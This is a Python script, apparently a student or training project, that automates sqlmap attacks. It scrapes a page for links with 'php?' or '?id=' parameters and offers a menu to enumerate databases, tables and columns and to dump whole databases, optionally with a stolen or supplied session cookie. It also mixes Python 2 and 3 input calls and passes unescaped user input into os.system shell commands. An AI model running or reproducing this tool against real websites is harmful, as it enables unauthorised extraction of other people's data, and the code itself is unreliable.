import requests
import bs4
import os
import re


print("HPE CTY SQLMAP AUTOMATION")

url = input("Enter a sql_url: ")  # for sql url
print("The URL Entered is: ",url)
res = requests.get(url)
#print(res.text)
soup = bs4.BeautifulSoup(res.text, 'html5lib')
main = raw_input("Enter the main URL if any: ")

list1=[]
for link in soup.find_all('a',href=True):
	if main in link['href']:
		list1.append(link['href'])
            	#print(link['href'])
	else:
            list1.append(main+link['href'])
            #print(main+link['href'])
list2=[]

for i in list1:
	if "php?" in i:
		list2.append(i)
for i in list1:
	if "?id=" in i:
		list2.append(i)
#print(list2)
print(" ")
print("choose an URL: ")
print("Your option are :")
for i in list2:
	print(i)
print(" ")

url = raw_input("Enter the choosen sql_url: ")  # for sql url
print(" ")
cookie = raw_input("Enter cookie of the website (optional) : ")

level=1
risk=1

level = raw_input("Enter the level (integer 1-5) : ")

risk = raw_input("Enter the risk (integer 1-3) : ")


if cookie == "":
	


	def database():
	    os.system("sqlmap " + "-u " + url + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


	def tables():
	    #d_name = input("Enter a database name: ")
	    os.system("sqlmap " + "-u " + url + " --tables" + " --level=" + level + " --risk=" + risk)


	'''
	def col():
	    d_name = input("Enter a database name: ")
	    t_nmae = input("Enter a tables name: ")
	    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
	'''

	def col_dump():
	    #d_name = input("Enter a database name: ")
	    #t_nmae = input("Enter a tables name: ")
	    #c_name = input("Enter a column name: ")
	    os.system("sqlmap " + "-u " + url + " --columns" + " --level=" + level + " --risk=" + risk)

	def a_dump():
	    os.system("sqlmap " + "-u " + url + " --dump" + " --level=" + level + " --risk=" + risk)


	choose = 0
	while choose!=6:
		print("""
            1. Database Dump
            2. Tables names Dump
            3. Column names Dump
            4. Dump All
	    5. Run All
            6. exit
            """)
		choose = int(input("Enter a number: "))
		if choose == 1:
			database()
		elif choose == 2:
			tables()
		elif choose == 3:
			col_dump()
		elif choose == 4:
			a_dump()
		elif choose == 5:
			database()
			tables()
			col_dump()
			a_dump()
		elif choose == 6:
			#os.system("clear")
			print("Have a nice day")
			os.system("exit")
			choose = 6
		else:
			print("wrong input please Give value Between 1 and 6 !!")


else:
	
	cookie = "\"" + cookie + "\""
	url = "\"" + url + "\""
	

	def database():
	    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


	def tables():
	    #d_name = input("Enter a database name: ")
	    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --tables" + " --level=" + level + " --risk=" + risk)


	'''
	def col():
	    d_name = input("Enter a database name: ")
	    t_nmae = input("Enter a tables name: ")
	    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
	'''

	def col_dump():
	    #d_name = input("Enter a database name: ")
	    #t_nmae = input("Enter a tables name: ")
	    #c_name = input("Enter a column name: ")
	    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --columns" + " --level=" + level + " --risk=" + risk)

	def a_dump():
	    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dump" + " --level=" + level + " --risk=" + risk)

	
	
	choose = 0
	while choose!=6:
		print("""
            1. Database Dump
            2. Tables names Dump
            3. Column names Dump
            4. Dump All
	    5. Run All
            6. exit
            """)
		choose = int(input("Enter a number: "))
		if choose == 1:
			database()
		elif choose == 2:
			tables()
		elif choose == 3:
			col_dump()
		elif choose == 4:
			a_dump()
		elif choose == 5:
			database()
			tables()
			col_dump()
			a_dump()
		elif choose == 6:
			#os.system("clear")
			print("Have a nice day")
			os.system("exit")
			choose = 6
		else:
			print("wrong input please Give value Between 1 and 6 !!")
